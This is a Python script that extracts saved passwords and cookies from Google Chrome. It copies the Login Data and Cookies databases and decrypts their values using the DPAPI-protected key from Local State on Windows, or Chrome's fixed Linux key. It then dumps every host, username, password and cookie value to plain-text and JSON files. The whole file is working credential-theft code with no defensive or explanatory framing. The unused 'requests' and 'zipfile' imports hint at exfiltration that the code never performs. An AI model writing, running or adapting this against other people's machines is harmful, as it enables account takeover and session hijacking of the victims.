import os
import sys
import shutil
import sqlite3
import win32crypt
import json
import base64
import requests
import zipfile

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)

NONCE_BYTE_SIZE = 12
APP_DATA_PATH = os.environ['LOCALAPPDATA']
APP_FOLDER = r'Google\Chrome'

LOCAL_STATE_PATH = os.path.join(
    APP_DATA_PATH, APP_FOLDER + r'\User Data\Local State')
DB_PASSWORD_PATH = os.path.join(
    APP_DATA_PATH, APP_FOLDER + r'\User Data\Default\Login Data')
DB_COOKIE_PATH = os.path.join(
    APP_DATA_PATH, APP_FOLDER + r'\User Data\Default\Cookies')


# def encrypt(cipher, plaintext, nonce):
#     cipher.mode = modes.GCM(nonce)
#     encryptor = cipher.encryptor()
#     ciphertext = encryptor.update(plaintext)
#     return (cipher, ciphertext, nonce)


class ChromeDecrypter:
    @staticmethod
    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    @staticmethod
    def get_cipher(key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    @staticmethod
    def dpapi_decrypt(encrypted_txt):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted_txt, len(encrypted_txt))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    @staticmethod
    def get_key_from_local_state():
        jsn = None
        with open(LOCAL_STATE_PATH, encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    @staticmethod
    def aes_decrypt(encrypted_txt):
        encoded_key = ChromeDecrypter.get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = ChromeDecrypter.dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = ChromeDecrypter.get_cipher(key)
        return ChromeDecrypter.decrypt(cipher, encrypted_txt[15:], nonce)

    @staticmethod
    def unix_decrypt(encrypted_txt):
        if sys.platform.startswith('linux'):
            password = 'peanuts'
            iterations = 1
        else:
            raise NotImplementedError

        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2

        salt = 'saltysalt'
        iv = ' ' * 16
        length = 16
        key = PBKDF2(password, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted_txt[3:])
        return decrypted[:-ord(decrypted[-1])]

    @staticmethod
    def chrome_decrypt(encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = ChromeDecrypter.dpapi_decrypt(
                        encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = ChromeDecrypter.aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return ChromeDecrypter.unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None


class ChromePassword:
    def __init__(self):
        self._sql = 'select signon_realm,username_value,password_value from logins'
        self.dbPath = DB_PASSWORD_PATH
        self.passList = []

    def get_chrome_db(self):
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_pass')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(self.dbPath, _temp_path)
        return _temp_path

    def get_passwords(self):
        self.passList = []
        db_file = self.get_chrome_db()

        conn = sqlite3.connect(db_file)
        for row in conn.execute(self._sql):
            host = row[0]
            if host.startswith('android'):
                continue
            username = row[1]
            password = ChromeDecrypter.chrome_decrypt(row[2])
            item = {
                'host': host,
                'username': username,
                'password': password
            }
            self.passList.append(item)
        conn.close()

        os.remove(db_file)

    def save_txt(self, fileOut='passwords.txt'):
        if(len(self.passList)) == 0:
            self.get_passwords()

        print('Save all passwords in ' + self.dbPath + ' to ' + fileOut)
        with open(fileOut, 'w', encoding='utf-8') as f:
            texts = [
                'Hostname: %s\nUsername: %s\nPassword: %s\n\n' % (
                    line['host'], line['username'], line['password'])
                for line in self.passList
            ]
            f.writelines(texts)

    def save_json(self, fileOut='passwords.json'):
        if(len(self.passList)) == 0:
            self.get_passwords()

        print('Save all passwords in ' + self.dbPath + ' to ' + fileOut)
        with open(fileOut, 'w', encoding='utf-8') as f:
            json.dump(self.passList, f)


class ChromeCookie:
    def __init__(self):
        self._sql = 'SELECT creation_utc, host_key, name, expires_utc, encrypted_value, value FROM cookies'
        self.dbPath = DB_COOKIE_PATH
        self.cookieList = []

    def get_chrome_db(self):
        _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_cookie')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(self.dbPath, _temp_path)
        return _temp_path

    def get_cookies(self):
        self.cookieList = []
        db_file = self.get_chrome_db()

        conn = sqlite3.connect(db_file)
        for row in conn.execute(self._sql):
            if row[5] == "":
                try:
                    value = ChromeDecrypter.chrome_decrypt(row[4])
                except Exception:
                    value = "<Unknown>"
            else:
                value = row[5]

            item = {"host": row[1], "creation": row[0],
                    "expires": row[3], "name": row[2], "value": value}
            self.cookieList.append(item)
        conn.close()

        os.remove(db_file)

    def save_txt(self, fileOut='cookies.txt'):
        if(len(self.cookieList)) == 0:
            self.get_cookies()

        print('Save all cookies in ' + self.dbPath + ' to ' + fileOut)
        with open(fileOut, 'w', encoding='utf-8') as f:
            texts = [
                'Host: %s\nCreation: %s\nExpires: %s\nName: %s\nValue: %s\n\n' % (
                    line['host'], line['creation'], line['expires'], line['name'], line['value'])
                for line in self.cookieList
            ]
            f.writelines(texts)

    def save_json(self, fileOut='cookies.json'):
        if(len(self.cookieList)) == 0:
            self.get_cookies()

        print('Save all cookies in ' + self.dbPath + ' to ' + fileOut)
        with open(fileOut, 'w', encoding='utf-8') as f:
            json.dump(self.cookieList, f)


def main():
    chromePass = ChromePassword()
    chromePass.save_txt()
    chromePass.save_json()

    chromeCookie = ChromeCookie()
    chromeCookie.save_txt()
    chromeCookie.save_json()


if __name__ == "__main__":
    main()
